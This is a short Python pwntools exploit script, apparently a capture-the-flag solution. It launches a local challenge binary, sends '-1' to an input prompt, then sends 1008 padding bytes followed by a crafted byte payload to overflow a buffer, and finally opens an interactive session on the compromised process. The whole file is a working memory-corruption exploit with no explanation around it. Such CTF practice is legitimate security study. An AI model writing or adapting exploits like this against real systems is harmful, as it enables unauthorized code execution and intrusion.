from pwn import *
import sys

class io:
    @classmethod
    def connect(cls):
        cls.io = process('/pwn/' + sys.argv[0].split('.py')[0])
    @classmethod
    def readuntil(cls, x, timeout = None):
        return cls.readuntil_internal(x, time_out = timeout)
    @classmethod
    def readuntil_internal(cls, x, time_out):
        ret = cls.io.readuntil(x, timeout = time_out) if time_out else cls.io.readuntil(x)
        sys.stdout.write(ret)
        return ret
    @classmethod
    def write(cls, x):
        sys.stdout.write(x)
        cls.io.write(x)
    @classmethod
    def sendline(cls, x):
        cls.write(x + '\n')
    @classmethod
    def close(cls):
        cls.io.close()
    @classmethod
    def interactive(cls):
        cls.io.interactive()

def main():
    io.connect()

    pl = '\x1a'*2
    pl += '\xb1'*4
    pl += '\x3b'*2
    pl += '\x30'*3
    pl += '\x19'*4
    pl += '\x37'*2
    pl += '\x3e'*3
    pl += '\xc3'*4
    pl += '\0'

    io.readuntil('? ')
    io.sendline('-1')
    io.readuntil('!')
    io.sendline('A'*1008 + pl)

if __name__ == '__main__':
    main()
    io.interactive()
